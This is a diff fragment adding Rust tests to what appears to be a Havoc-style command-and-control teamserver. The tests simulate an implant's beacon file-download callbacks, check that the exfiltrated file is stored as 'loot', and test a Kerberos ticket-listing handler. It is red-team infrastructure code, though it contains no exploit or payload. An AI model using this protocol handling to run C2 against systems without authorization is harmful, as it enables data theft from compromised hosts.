+        add_u32(&mut write, u32::from(DemonCallback::FileWrite));
+        add_bytes(&mut write, &chunk);
+        dispatcher
+            .dispatch(0xABCD_EF21, u32::from(DemonCommand::BeaconOutput), 0x77, &write)
+            .await?;
+
+        let mut close = Vec::new();
+        add_u32(&mut close, u32::from(DemonCallback::FileClose));
+        add_bytes(&mut close, &file_id.to_be_bytes());
+        dispatcher
+            .dispatch(0xABCD_EF21, u32::from(DemonCommand::BeaconOutput), 0x77, &close)
+            .await?;
+
+        let _ = receiver.recv().await.ok_or("missing beacon open event")?;
+        let _ = receiver.recv().await.ok_or("missing beacon progress event")?;
+        let final_event = receiver.recv().await.ok_or("missing beacon completion event")?;
+        let OperatorMessage::AgentResponse(message) = final_event else {
+            panic!("expected beacon file completion response");
+        };
+        assert_eq!(message.info.extra.get("MiscType"), Some(&Value::String("download".to_owned())));
+
+        let loot = database.loot().list_for_agent(0xABCD_EF21).await?;
+        assert_eq!(loot.len(), 1);
+        assert_eq!(loot[0].data.as_deref(), Some(content.as_slice()));
+        assert_eq!(loot[0].file_path.as_deref(), Some(remote_path));
+        Ok(())
+    }
+
+    #[tokio::test]
     async fn builtin_kerberos_klist_handler_formats_ticket_output()
     -> Result<(), Box<dyn std::error::Error>> {
         let database = Database::connect_in_memory().await?;
@@ -2216,6 +3138,10 @@ mod tests {
     }
 
     fn add_u32(buf: &mut Vec<u8>, value: u32) {
+        buf.extend_from_slice(&value.to_le_bytes());
+    }
+
+    fn add_u64(buf: &mut Vec<u8>, value: u64) {
         buf.extend_from_slice(&value.to_le_bytes());
     }
 
